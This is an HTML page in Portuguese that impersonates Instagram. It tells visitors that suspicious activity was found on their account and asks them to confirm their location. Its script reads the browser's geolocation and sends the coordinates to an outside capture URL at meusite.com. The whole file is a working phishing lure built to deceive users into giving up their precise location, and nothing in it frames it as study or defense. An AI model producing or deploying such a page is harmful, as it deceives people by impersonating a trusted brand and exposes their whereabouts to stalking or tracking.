<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
            margin: 0;
        }
        .container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 20px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
        }
        .message {
            font-size: 14px;
            color: #262626;
            margin-bottom: 20px;
        }
        button {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px 16px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            background-color: #007bbf;
        }
        .footer {
            font-size: 12px;
            color: #8e8e8e;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/512px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
        </div>
        <div class="message">
            Detectamos uma atividade suspeita em sua conta. Para garantir que sua conta esteja segura, confirme sua localização clicando no botão abaixo.
        </div>
        <button onclick="getLocation()">Verificar Localização</button>
        <p id="demo"></p>
        <div class="footer">
            © 2024 Instagram
        </div>
    </div>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                document.getElementById("demo").innerHTML = "Geolocalização não é suportada por este navegador.";
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            // Redireciona para o servidor com as coordenadas
            window.location.href = `https://meusite.com/captura?lat=${lat}&lon=${lon}`;
        }

        function showError(error) {
            let message;
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    message = "Permissão negada. Não podemos verificar sua localização.";
                    break;
                case error.POSITION_UNAVAILABLE:
                    message = "Informações de localização indisponíveis.";
                    break;
                case error.TIMEOUT:
                    message = "A solicitação de localização expirou.";
                    break;
                case error.UNKNOWN_ERROR:
                    message = "Um erro desconhecido ocorreu.";
                    break;
            }
            document.getElementById("demo").innerHTML = message;
        }
    </script>
</body>
</html>
